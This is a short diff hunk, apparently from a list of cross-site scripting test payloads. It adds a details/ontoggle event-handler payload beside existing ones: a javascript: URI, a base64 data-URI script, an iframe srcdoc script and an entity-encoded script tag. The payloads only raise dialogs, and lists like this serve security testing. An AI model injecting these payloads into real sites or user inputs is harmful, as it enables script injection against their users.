@@ -26,5 +26,6 @@ javascript:alert('XSS')
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></object>
 <iframe srcdoc='<script>alert("XSS")</script>'></iframe>
 
+<details/open/ontoggle=confirm`Hello, World!`>
 
 &#60;script&#62;alert('Hello, World!')&#60;/script&#62;
